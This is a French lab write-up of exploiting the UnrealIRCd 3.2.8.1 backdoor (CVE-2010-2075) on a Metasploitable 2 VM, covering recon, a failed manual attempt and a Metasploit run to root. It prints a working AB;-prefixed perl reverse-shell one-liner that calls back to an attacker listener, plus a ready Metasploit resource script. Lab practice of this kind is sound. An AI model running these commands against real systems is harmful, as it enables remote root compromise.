# Write-up — UnrealIRCd 3.2.8.1 Backdoor (Metasploitable 2, port 6667)

Cible : `192.168.56.101` · Kali/LHOST : `192.168.56.1` · CVE-2010-2075 · Résultat : shell
**root**.

> Réseau : les services de josa tournent sur `vboxnet0` (`192.168.56.0/24`), pas sur le
> `172.28.128.x` de la doc partagée (voir `CLAUDE.md`). MS2 obtient son IP en DHCP ; ici
> `192.168.56.101` (repérée par `nmap -sn 192.168.56.0/24`, MAC `08:00:27:0A:71:3F`).

---

## 1. Recon

```bash
nmap -sC -sV -p 6667 192.168.56.101
```
```
PORT     STATE SERVICE VERSION
6667/tcp open  irc     UnrealIRCd
Service Info: Host: irc.Metasploitable.LAN
```

`nmap` identifie `UnrealIRCd` mais **pas le numéro de version exact** — or la faille qui nous
intéresse est spécifique à la 3.2.8.1. Tentative de récupérer la bannière de version à la
main en complétant le handshake IRC :

```bash
printf 'NICK recon\r\nUSER recon 0 * :recon\r\n' | nc 192.168.56.101 6667
```
```
:irc.Metasploitable.LAN NOTICE AUTH :*** Looking up your hostname...
:irc.Metasploitable.LAN NOTICE AUTH :*** Couldn't resolve your hostname; using your IP address instead
```

Le serveur throttle agressivement les reconnexions (`ERROR :Closing Link ... Throttled:
Reconnecting too fast` si on enchaîne trop vite) et n'a pas renvoyé le numéro `004` dans mes
essais. L'identification précise de la version se fera donc par la base d'exploits (étape
suivante), pas par la bannière — c'est de toute façon la backdoor elle-même qui confirmera la
version en s'exécutant.

## 2. Méthode d'identification de la CVE et du module

Question indépendante de tout outil : **cette version a-t-elle une faille connue ?**

```bash
searchsploit unrealircd
```
```
UnrealIRCd 3.2.8.1 - Backdoor Command Execution      | linux/remote/16922.rb
UnrealIRCd 3.2.8.1 - Local Configuration Stack Overfl | windows/dos/18011.txt
UnrealIRCd 3.2.8.1 - Remote Downloader/Execute        | linux/remote/13853.pl
UnrealIRCd 3.x - Remote Denial of Service             | windows/dos/27407.pl
```

Confirmé : une backdoor d'exécution de commande existe pour la 3.2.8.1. `searchsploit` ne
donne pas directement le chemin du module Metasploit ni la CVE ; comme l'outil d'exploitation
choisi est `msfconsole`, on y cherche le module :

```bash
msfconsole -q -x "search unrealircd; exit"
```
```
#  Full Name                                   Disclosure Date  Rank       Check  Name
0  exploit/unix/irc/unreal_ircd_3281_backdoor  2010-06-12       excellent  Yes    UnrealIRCD 3.2.8.1 Backdoor Command Execution
```

**C'est de là que vient le chemin exact `exploit/unix/irc/unreal_ircd_3281_backdoor`.** Reste
à obtenir la CVE et le mécanisme :

```bash
msfconsole -q -x "info exploit/unix/irc/unreal_ircd_3281_backdoor; exit"
```
```
Description:
  This module exploits a malicious backdoor that was added to the
  Unreal IRCD 3.2.8.1 download archive.
References:
  https://nvd.nist.gov/vuln/detail/CVE-2010-2075
  http://www.unrealircd.com/txt/unrealsecadvisory.20100612.txt
```

**CVE-2010-2075.** En novembre 2009, l'archive source officielle d'UnrealIRCd 3.2.8.1 a été
remplacée par une version trafiquée sur les miroirs de téléchargement (compromission de la
chaîne de distribution, comme vsftpd 2.3.4 — pas une faille de code de la version légitime).
Le code injecté scrute les données reçues : **toute ligne commençant par `AB;` voit le reste
passé directement à `system()`** côté serveur, exécuté avec les droits du démon (ici
**root**). Metasploitable 2 embarque délibérément cette version trafiquée.

## 3. Tentative manuelle (règle du jeu : avant Metasploit)

Principe : ouvrir une connexion TCP sur 6667 et envoyer une ligne `AB;<commande>`. La backdoor
étant **aveugle** (la sortie de la commande ne revient pas sur la connexion IRC), on fait
renvoyer la preuve vers Kali par un reverse shell. Payload perl (perl est présent sur MS2) qui
se connecte à Kali et y recrache `id`/`uname`/`hostname` :

Fichier `ab_only.txt` (envoyé en **LF seul** — un `\r` final casserait la commande shell) :
```
AB;perl -e 'use Socket;$i="192.168.56.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){print S `id`;print S `uname -a`;print S `hostname`;close S;}'
```

Listener côté Kali puis déclenchement :
```bash
nc -lvnp 4444                # terminal 1
nc -q 12 192.168.56.101 6667 < ab_only.txt   # terminal 2
```

**Résultat : aucune connexion de retour.** Diagnostic mené pour écarter les fausses pistes :

- Le one-liner perl est correct — vérifié en le lançant **localement** sur Kali contre un
  listener loopback, il renvoie bien `id`/`uname`/`hostname`.
- Le reverse perl depuis MS2 vers `192.168.56.1:4444` fonctionne — prouvé par Metasploit à
  l'étape 4, qui utilise exactement ce canal.
- Plusieurs variantes testées (avec/sans registration IRC `NICK`/`USER` préalable, `nc -q`
  vs sous-shell maintenu ouvert, `\n` vs `\r\n`, nc en chemin absolu + fallback perl) :
  **toutes échouent à déclencher la backdoor via `nc`**.

Conclusion : la livraison de la ligne `AB;` par `nc` ne déclenche pas l'exécution de façon
fiable sur cette instance (sensibilité aux frontières de paquets TCP au moment où le serveur
lit l'entrée), alors que la socket du module Metasploit, elle, la passe correctement. C'est
précisément la raison pour laquelle le module existe et reste la voie fiable ici — on bascule
dessus.

## 4. Exploiter (Metasploit)

🖥 Kali — via resource script :
```bash
cat > /tmp/unrealircd.rc << 'EOF'
use exploit/unix/irc/unreal_ircd_3281_backdoor
set RHOSTS 192.168.56.101
set RPORT 6667
set LHOST 192.168.56.1
set LPORT 4444
set payload cmd/unix/reverse_perl
run -z
sessions -c 'id; uname -a; hostname; whoami' -i 1
exit -y
EOF
msfconsole -q -r /tmp/unrealircd.rc
```

Résultat :
```
[*] Started reverse TCP handler on 192.168.56.1:4444
[*] 192.168.56.101:6667 - Connected to 192.168.56.101:6667
[*] 192.168.56.101:6667 - Trying to register a new IRC user: keneth
[+] 192.168.56.101:6667 - The target appears to be vulnerable. UnrealIRCd detected via IRC commands
[*] 192.168.56.101:6667 - Sending IRC backdoor command
[*] Command shell session 1 opened (192.168.56.1:4444 -> 192.168.56.101:58941)
```

Le module se connecte, confirme qu'il s'agit bien d'UnrealIRCd (phase `check`), puis envoie
`AB;` suivi du payload perl encodé et récupère le reverse shell.

**Note :** `LHOST`/`LPORT` sont nécessaires car `cmd/unix/reverse_perl` est un payload reverse
— comme tout reverse, il doit savoir où rappeler. Le payload par défaut proposé par le module
(`cmd/linux/http/.../meterpreter/reverse_tcp`) n'aboutissait pas ici ; `cmd/unix/reverse_perl`
(simple, s'appuie sur perl déjà présent) est fiable sur cette vieille cible.

## 5. Preuve d'accès

Commande exécutée **dans la session obtenue** (`sessions -c ... -i 1`) :
```
uid=0(root) gid=0(root)
Linux metasploitable 2.6.24-16-server #1 SMP Thu Apr 10 13:58:00 UTC 2008 i686 GNU/Linux
metasploitable
root
```

→ **Root direct**, sans étape d'élévation de privilèges : le démon IRC tournait en root, donc
la commande injectée par la backdoor s'exécute en root. Même famille que vsftpd 2.3.4
(backdoor dans un tarball officiel compromis), ici via le préfixe magique `AB;` au lieu du
`:)` dans un login FTP.

---

**Pour rejouer depuis zéro** : `./start.sh`, localiser l'IP (`nmap -sn 192.168.56.0/24`), puis
directement l'étape 4. Laisser ~15 s entre deux connexions au port 6667 pour éviter le
throttle du serveur.
